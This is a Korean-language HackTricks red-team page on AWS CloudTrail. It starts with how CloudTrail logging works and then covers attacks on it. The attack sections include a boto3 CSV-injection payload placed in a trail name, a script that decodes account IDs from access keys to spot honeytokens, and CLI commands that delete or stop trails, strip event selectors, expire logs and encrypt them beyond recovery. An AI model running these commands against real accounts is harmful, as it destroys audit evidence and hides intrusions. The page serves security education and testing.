# AWS - CloudTrail Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## **CloudTrail**

AWS CloudTrail은 **AWS 환경 내에서의 활동을 기록하고 모니터링**합니다. 이는 AWS 리소스와의 모든 상호작용에 대해 누가 언제 어디서 무엇을 했는지를 포함한 상세한 **이벤트 로그**를 캡처합니다. 이는 변경 사항 및 작업의 감사 트레일을 제공하여 보안 분석, 규정 준수 감사 및 리소스 변경 추적에 도움이 됩니다. CloudTrail은 사용자 및 리소스 동작을 이해하고 보안 포지션을 강화하며 규정 준수를 보장하는 데 필수적입니다.

각 로그 이벤트에는 다음이 포함됩니다:

* 호출된 API의 이름: `eventName`
* 호출된 서비스: `eventSource`
* 시간: `eventTime`
* IP 주소: `SourceIPAddress`
* 에이전트 메서드: `userAgent`. 예시:
* Signing.amazonaws.com - AWS Management Console에서
* console.amazonaws.com - 계정의 루트 사용자
* lambda.amazonaws.com - AWS Lambda에서
* 요청 매개변수: `requestParameters`
* 응답 요소: `responseElements`

이벤트는 **약 5분마다 JSON 파일로 새로운 로그 파일에 기록**되며, CloudTrail에 의해 보유되며, 로그 파일은 **약 15분 후에 S3로 전달**됩니다.\
CloudTrail 로그는 **계정 및 지역 간에 집계**될 수 있습니다.\
CloudTrail은 로그 파일 무결성을 사용하여 CloudTrail이 제공한 로그 파일이 변경되지 않았는지 확인할 수 있습니다. 로그 내용의 SHA-256 해시를 다이제스트 파일 내에 생성합니다. 새로운 로그의 sha-256 해시는 매 시간마다 생성됩니다.\
Trail을 생성할 때 이벤트 선택기를 사용하여 로그를 기록할 Trail을 지정할 수 있습니다: 관리, 데이터 또는 인사이트 이벤트.

로그는 S3 버킷에 저장됩니다. 기본적으로 Server Side Encryption (SSE-S3)이 사용되므로 AWS는 액세스 권한이 있는 사람들을 위해 내용을 복호화합니다. 그러나 추가 보안을 위해 KMS와 자체 키를 사용할 수도 있습니다.

로그는 다음과 같은 이름 형식의 **S3 버킷에 저장**됩니다:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* 여기서 BucketName은 다음과 같습니다: **`aws-cloudtrail-logs-<accountid>-<random>`**
* 예시: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

각 폴더 안에 각 로그는 다음 형식을 따르는 **이름**을 가지게 됩니다: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

로그 파일 네이밍 규칙

![](<../../../../.gitbook/assets/image (29).png>)

또한, \*\*다이제스트 파일(파일 무결성 확인)\*\*은 **동일한 버킷**에 다음과 같이 있습니다:

![](<../../../../.gitbook/assets/image (22).png>)

### 여러 계정에서 로그 집계

* 로그 파일을 전달할 AWS 계정에서 Trial을 생성합니다.
* CloudTrail에 대한 교차 계정 액세스를 허용하고 액세스가 필요한 각 AWS 계정에 대한 권한을 목적지 S3 버킷에 적용합니다.
* 다른 AWS 계정에서 새 Trail을 생성하고 1단계에서 생성한 버킷을 사용하도록 선택합니다.

그러나 동일한 S3 버킷에 모든 로그를 저장할 수는 있지만, 여러 계정의 CloudTrail 로그를 단일 AWS 계정에 속한 CloudWatch Logs로 집계할 수는 없습니다.

{% hint style="danger" %}
계정은 CloudTrail에서 **활성화된 다른 Trail**을 가질 수 있으며, 동일한 (또는 다른) 로그를 다른 버킷에 저장할 수 있습니다.
{% endhint %}

### 모든 조직 계정의 Cloudtrail을 1개로

CloudTrail을 생성할 때, 조직의 모든 계정에 대해 CloudTrail을 활성화하고 로그를 하나의 버킷에 저장할 수 있습니다:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

이렇게 하면 모든 계정의 모든 지역에 대해 CloudTrail을 쉽게 구성하고 로그를 1개의 계정(보호해야 함)에 집중시킬 수 있습니다.

### 로그 파일 확인

로그가 변경되지 않았는지 확인하기 위해 다음을 실행하여 로그를 확인할 수 있습니다.

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### CloudWatch로의 로그

**CloudTrail은 로그를 자동으로 CloudWatch로 보낼 수 있으므로, 수상한 활동이 수행될 때 경고를 설정할 수 있습니다.**\
CloudTrail이 로그를 CloudWatch로 보낼 수 있도록 하려면 \*\*역할(role)\*\*을 생성해야 합니다. 가능하다면, 이러한 작업을 수행하기 위해 AWS 기본 역할을 사용하는 것이 좋습니다. 이 역할은 CloudTrail이 다음 작업을 수행할 수 있도록 허용합니다:

* CreateLogStream: CloudWatch Logs 로그 스트림을 생성할 수 있습니다.
* PutLogEvents: CloudTrail 로그를 CloudWatch Logs 로그 스트림에 전달할 수 있습니다.

### 이벤트 기록

CloudTrail 이벤트 기록을 통해 기록된 로그를 테이블에서 검사할 수 있습니다:

![](<../../../../.gitbook/assets/image (24).png>)

### 인사이트

**CloudTrail 인사이트**는 CloudTrail 트레일에서의 쓰기 관리 이벤트를 자동으로 분석하고, **비정상적인 활동**에 대해 **경고**를 보냅니다. 예를 들어, 설정된 기준과 다른 `TerminateInstance` 이벤트의 증가가 있다면, 이를 인사이트 이벤트로 볼 수 있습니다. 이러한 이벤트는 **비정상적인 API 활동을 찾고 대응하는 것을 더욱 쉽게** 만들어줍니다.

인사이트는 CloudTrail 로그와 동일한 버킷에 저장됩니다: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### 보안

| CloudTrail 로그 파일 무결성 | <ul><li>로그가 조작되었는지(수정 또는 삭제) 확인</li><li><p>다이제스트 파일 사용 (각 파일에 대한 해시 생성)</p><ul><li>SHA-256 해싱</li><li>디지털 서명을 위한 RSA와 함께 SHA-256</li><li>Amazon 소유의 개인 키</li></ul></li><li>다이제스트 파일 생성에는 1시간이 소요됩니다 (매 시간 정각에 수행됨)</li></ul> |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 무단 접근 방지             | <ul><li><p>IAM 정책과 S3 버킷 정책 사용</p><ul><li>보안 팀 —> 관리자 액세스</li><li>감사인 —> 읽기 전용 액세스</li></ul></li><li>로그를 암호화하기 위해 SSE-S3/SSE-KMS 사용</li></ul>                                                                                |
| 로그 파일 삭제 방지          | <ul><li>IAM 및 버킷 정책으로 삭제 액세스 제한</li><li>S3 MFA 삭제 구성</li><li>로그 파일 유효성 검사로 확인</li></ul>                                                                                                                                      |

## 액세스 어드바이저

AWS 액세스 어드바이저는 최근 400일 동안의 AWS **CloudTrail 로그를 사용하여 인사이트를 수집**합니다. CloudTrail은 AWS 계정에서 수행된 AWS API 호출 및 관련 이벤트의 기록을 캡처합니다. 액세스 어드바이저는 이 데이터를 활용하여 IAM 사용자 또는 역할이 액세스한 AWS 서비스와 해당 액세스가 발생한 시간을 **표시**합니다. CloudTrail 로그를 분석함으로써, 액세스 어드바이저는 사용되지 않은 서비스와 실제 사용 패턴에 기반한 과도한 권한을 식별하여 AWS 관리자가 권한을 세밀하게 조정하는 데 도움을 줍니다.

{% hint style="success" %}
따라서, 액세스 어드바이저는 **사용자에게 부여된 불필요한 권한을 알려주므로** 관리자가 이를 제거할 수 있습니다.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## 작업

### 열거

```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```

### **CSV Injection (CSV 주입)**

CloudTrail 내에서 CSV 주입을 수행하여 로그가 CSV로 내보내지고 Excel에서 열릴 경우 임의의 코드를 실행할 수 있습니다.\
다음 코드는 페이로드를 포함한 잘못된 Trail 이름을 생성하는 로그 항목을 생성합니다.

```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```

CSV 주입에 대한 자세한 정보는 다음 페이지를 참조하십시오:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

이 특정 기술에 대한 자세한 정보는 [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)에서 확인하십시오.

## **탐지 우회**

### HoneyTokens 우회

HoneyTokens는 민감한 정보의 유출을 탐지하기 위해 생성됩니다. AWS의 경우, 이들은 모니터링되는 AWS 키입니다. 해당 키로 작업이 트리거되면 누군가가 그 키를 도용한 것입니다.

그러나 이 모니터링은 **CloudTrail**을 통해 수행되며, 일부 **AWS 서비스는 CloudTrail에 로그를 보내지 않습니다** (여기에서 [목록](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)을 찾을 수 있음). 이러한 서비스 중 일부는 무단으로 접근한 사람(허니토큰 키)이면 **키 역할의 ARN을 포함한 오류**로 응답합니다.

이렇게 하면 **공격자는 로그를 트리거하지 않고도 키의 ARN을 얻을 수 있습니다**. ARN에서 공격자는 **AWS 계정 ID와 이름**을 볼 수 있으므로, 허니토큰의 회사 계정 ID와 이름을 쉽게 알 수 있습니다. 이렇게 하면 공격자는 토큰이 허니토큰인지 확인할 수 있습니다.

![](<../../../../.gitbook/assets/image (65).png>)

#### **HoneyTokens 탐지**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57)는 [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**의 키를 탐지합니다**:

* 역할 이름이나 계정 ID에 \*\*`canarytokens.org`\*\*가 나타나는 경우 또는 오류 메시지에 \*\*`534261010715`\*\*가 나타나는 경우.
* 최근에 테스트한 결과, 계정 \*\*`717712589309`\*\*를 사용하고 이름에 **`canarytokens.com`** 문자열이 여전히 포함되어 있습니다.
* 역할 이름 또는 오류 메시지에 \*\*`SpaceCrab`\*\*이 나타나는 경우
* **SpaceSiren**은 사용자 이름을 생성하기 위해 **uuid**를 사용합니다: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* 이름이 무작위로 생성된 것처럼 보인다면, 허니토큰일 가능성이 높습니다.

{% hint style="danger" %}
CloudTrail 로그를 생성하지 않는 것으로 확인된 모든 공개 API가 현재 수정되었으므로, 직접 찾아야 할 수도 있습니다...

또는 [**여기에서 설명한대로**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) 액세스 키 내에 인코딩된 **계정 ID**를 가져와 Honeytokens AWS 계정 목록과 계정 ID를 확인할 수 있습니다.

```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

자세한 내용은 [**원본 연구**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)를 확인하세요.

### 제3의 인프라 접근

일부 AWS 서비스는 **데이터베이스**나 **Kubernetes** 클러스터(EKS)와 같은 인프라를 생성합니다. 이러한 서비스에 직접 접근하는 사용자(예: Kubernetes API)는 **AWS API를 사용하지 않으므로**, CloudTrail은 이 통신을 볼 수 없습니다.

따라서, EKS에 액세스할 수 있는 사용자는 EKS API의 URL을 발견하고, 로컬에서 토큰을 생성하여 **CloudTrail에 감지되지 않고 직접 API 서비스와 통신**할 수 있습니다.

자세한 내용은 다음을 참조하세요:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail 구성 수정

#### 트레일 삭제

```bash
aws cloudtrail delete-trail --name [trail-name]
```

#### 트레일 중지

To stop a trail, use the `stop-logging` command followed by the trail name. This will halt the logging of events for the specified trail.

트레일을 중지하려면 `stop-logging` 명령을 사용한 다음 트레일 이름을 입력하십시오. 이렇게 하면 지정된 트레일의 이벤트 로깅이 중지됩니다.

```bash
aws cloudtrail stop-logging --name [trail-name]
```

#### 다중 지역 로깅 비활성화

{% code overflow="wrap" %}
```
```
{% endcode %}

```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```

#### 이벤트 선택기를 사용하여 로깅 비활성화

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

첫 번째 예제에서는 단일 이벤트 선택기가 JSON 배열로 제공됩니다. `"ReadWriteType": "ReadOnly"`는 **이벤트 선택기가 읽기 전용 이벤트만 캡처**하도록 지정합니다 (예를 들어 CloudTrail 인사이트는 쓰기 이벤트를 확인하지 않습니다).

특정 요구 사항에 따라 이벤트 선택기를 사용자 정의할 수 있습니다.

#### S3 라이프사이클 정책을 통한 로그 삭제

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### 버킷 구성 수정

* S3 버킷 삭제
* 버킷 정책 변경하여 CloudTrail 서비스로부터의 쓰기 작업 거부
* S3 버킷에 수명 주기 정책 추가하여 객체 삭제
* CloudTrail 로그를 암호화하는 데 사용된 KMS 키 비활성화

### Cloudtrail 랜섬웨어

#### S3 랜섬웨어

**비대칭 키를 생성**하고 **CloudTrail이 해당 키로 데이터를 암호화**하도록 만들고 **개인 키를 삭제**하여 CloudTrail 콘텐츠를 복구할 수 없도록 할 수 있습니다.\
이는 기본적으로 다음과 같은 **S3-KMS 랜섬웨어**입니다:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS 랜섬웨어**

이는 이전 공격을 다른 권한 요구 사항으로 수행하는 가장 쉬운 방법입니다:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **참고 자료**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
